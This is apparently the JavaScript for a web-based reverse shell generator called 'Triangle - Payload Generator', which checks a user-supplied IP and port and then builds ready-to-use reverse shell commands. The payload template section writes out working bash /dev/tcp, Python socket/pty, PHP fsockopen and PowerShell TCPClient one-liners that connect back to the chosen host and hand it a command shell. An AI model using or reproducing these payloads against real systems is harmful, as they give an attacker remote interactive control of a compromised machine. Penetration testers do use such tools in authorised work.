/*
 * Triangle - Payload Generator (PRO UPGRADE)
 * Version: 1.1.0
*/

document.addEventListener('DOMContentLoaded', () => {

/* ================= HELPERS ================= */

const clean = v => v.trim();

const isValidIP = ip => {
const ipv4=/^(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/;
return ipv4.test(ip);
};

const isValidPort = p => {
const n=Number(p);
return n>0 && n<=65535;
};

/* ================= DOM ================= */

const ipInput=document.getElementById('rs-ip');
const portInput=document.getElementById('rs-port');
const generateBtn=document.getElementById('rs-generate-btn');
const outputContainer=document.getElementById('rs-output-container');

const bashOutput=document.getElementById('rs-bash');
const pythonOutput=document.getElementById('rs-python');
const phpOutput=document.getElementById('rs-php');
const powershellOutput=document.getElementById('rs-powershell');

if(generateBtn){

generateBtn.addEventListener('click',()=>{

const ip=clean(ipInput.value);
const port=clean(portInput.value);

/* Validation */

if(!ip || !port){
alert('Enter IP and Port');
return;
}

if(!isValidIP(ip)){
alert('Invalid IPv4 address');
return;
}

if(!isValidPort(port)){
alert('Invalid Port (1 - 65535)');
return;
}

/* Payload Templates */

bashOutput.value=`bash -i >& /dev/tcp/${ip}/${port} 0>&1`;

pythonOutput.value=`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`;

phpOutput.value=`php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;

powershellOutput.value=`$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;

/* Show Output */

outputContainer.style.display='block';

});

}

});
